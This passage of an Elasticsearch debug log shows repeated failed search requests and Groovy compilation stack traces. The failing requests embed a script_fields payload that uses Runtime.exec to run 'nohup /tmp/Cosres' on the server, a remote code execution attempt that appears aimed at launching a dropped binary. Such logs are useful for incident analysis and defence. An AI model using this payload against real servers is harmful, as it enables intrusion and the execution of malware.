+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2507.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 231.
+   Line())!=null){sb.append(str "
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 23:28:56,784][DEBUG][action.search.type       ] [Orb] [product][1], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@555bffd2] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][1]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"nohup /tmp/Cosres\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str \"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2510.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 231.
+   Line())!=null){sb.append(str "
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 23:28:56,786][DEBUG][action.search.type       ] [Orb] [product][4], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@555bffd2] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][4]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"nohup /tmp/Cosres\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str \"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2509.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 231.
+   Line())!=null){sb.append(str "
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 23:28:56,787][DEBUG][action.search.type       ] [Orb] [product][3], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@555bffd2] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][3]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"nohup /tmp/Cosres\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str \"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2508.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 231.
+   Line())!=null){sb.append(str "
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 23:28:56,788][DEBUG][action.search.type       ] [Orb] [product][2], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@555bffd2]
+org.elasticsearch.search.SearchParseException: [product][2]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"nohup /tmp/Cosres\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str \"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2506.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 231.
+   Line())!=null){sb.append(str "
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 23:28:56,788][DEBUG][action.search.type       ] [Orb] All shards failed for phase: [query]
